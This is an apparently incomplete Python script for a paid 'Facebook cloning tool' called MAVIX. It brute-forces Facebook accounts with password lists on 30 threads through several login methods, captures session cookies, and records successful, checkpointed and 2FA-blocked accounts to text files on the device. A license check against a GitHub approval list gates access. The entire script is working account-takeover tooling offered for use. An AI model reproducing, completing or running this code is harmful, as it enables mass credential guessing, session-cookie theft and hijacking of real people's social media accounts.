#Owner Mavix, Suzu, Bria,
#Original Written Suzu Constana
#Dont Try To bypass lol HAHA
...
logo=("""\033[1;37m
           ...
           888b     d888 888     888 Y88b   d88P 
           8888b   d8888 888     888  Y88b d88P  
           88888b.d88888 888     888   Y88o88P   
           888Y88888P888 Y88b   d88P    Y888P    
           888 Y888P 888  Y88b d88P     d888b    
           888  Y8P  888   Y88o88P     d88888b   
           888   "   888    Y888P     d88P Y88b  
           888       888     Y8P     d88P   Y88b                                                                                                        
\033[1;32m═══════════════════════════════════════════════           
\033[1;32m OWNER : MAVIX \033[92;1m•
\033[1;32m FACEBOOK : MAVIX, SUZU, BRIA,
\033[1;32m VERSION : 1.0
\033[1;32m═══════════════════════════════════════════════
\033[92;1m  HI ESWU WELCOME TO MAVIX        
\033[92;1m  FACEBOOK CLONING TOOLS \033[1;37m 
\033[1;32m═══════════════════════════════════════════════""")   
...
def asha(uid):
    if len(uid)==15:
        ...
        elif uid[:9] in ['100000000']       :alif = ' SINCE  2009 '
        elif uid[:8] in ['10000000']        :alif = ' SINCE 2009 '
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' SINCE 2009 '
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' SINCE 2010 '
        elif uid[:6] in ['100001']          :alif = ' SINCE 2010/2011 '
        elif uid[:6] in ['100002','100003'] :alif = ' SINCE 2011/2012 '
        elif uid[:6] in ['100004']          :alif = ' SINCE 2012/2013 '
        elif uid[:6] in ['100005','100006'] :alif = ' SINCE 2013/2014 '
        elif uid[:6] in ['100007','100008'] :alif = ' SINCE 2014/2015 '
        elif uid[:6] in ['100009']          :alif = ' SINCE 2015 '
        elif uid[:5] in ['10001']           :alif = ' SINCE 2015/2016 '
        elif uid[:5] in ['10002']           :alif = ' SINCE 2016/2017 '
        elif uid[:5] in ['10003']           :alif = ' SINCE 2018/2019 '
        elif uid[:5] in ['10004']           :alif = ' SINCE 2019/2020 '
        elif uid[:5] in ['10005']           :alif = ' SINCE 2020 '
        elif uid[:5] in ['10006','10007','']:alif = ' SINCE 2021 '
        elif uid[:5] in ['10008']           :alif = ' SINCE 2022 '
        elif uid[:5] in ['10009']           :alif = ' SINCE 2023 '
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' SINCE 2008/2009 '
    elif len(uid)==8:
        alif = ' SINCE 2007/2008 '
    elif len(uid)==7:
        alif = ' SINCE 2006/2007 '
    else:alif=''
    return alif
#APPROVAL
...
def Subscription():
	...
	clear()
	print(logo)
	r1=requests.get("https://github.com/mavix-424/approved/blob/main/approval.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
	else:
		os.system("clear")
		print(logo)
		print("\t \033[1;32m Pay First Then Use \033[1;37m ")
		time.sleep(1)
		os.system("clear")
		print(logo)
		print ("")
		print(" \033[1;32m Mavix Cloning Tool \033[1;37m\n")
		print(" \033[1;32m Note : THIS IS A PAID TOOL!   \033[1;37m")
		print ("")
		print(" Contact Mavix To Pay! ")
		print("")
		print(" Your key is not Approved. ")
		print("")
		print(" Copy and Send Key To Suzu Constana")
		print ("")
		print (" Your Key : "+key1 )
		print ("")
		name = input(" Date : ")
		...
		os.system('am start https://m.me/rosyrose015' + tks)
		Subscription()                                                                                 
Subscription()  
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m Please Wait Crack Is Fire!\033[1;37m")
                                        line()
                                        for user in fo:
...
def afg():
                ...
                with tred(max_workers=30) as S1N:     
                        ...
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mPlease Wait Cracking Is Fire! \033[1;97m')
                        line()
                        for psx in user:
                                ids = code+psx
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mMVX-FIRE\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m [MVX-FIRE] %s | %s'%(ids,pas))
                                open('/sdcard/MVX-FIRE.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MVX-FIRE-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        #print('\r\r\x1b[38;5;208m [MVX-FIRE] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MVX-FIRE.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mMVX-FIRE\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [MVX-FIRE] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				#print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/MVX-FIRE.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				#print(f'\r\r\033[1;33m [MVX-FIRE] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/MVX-FIRE.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mMVX-FIRE\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				...
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				open('/sdcard/MVX-FIRE-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
				...
				uid = str(po['error']['error_data']['uid'])
				#print(f'\r\r\033[1;33m [MVX-FIRE] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/MVX-FIRE-R-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def bd1(ids,passlist):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [MVX-FIRE] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/MVX-FIRE-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print(f'\r\r\033[1;33m [MVX-FIRE] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/MVX-FIRE-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mMVX-FIRE-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mMVX-FIRE\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
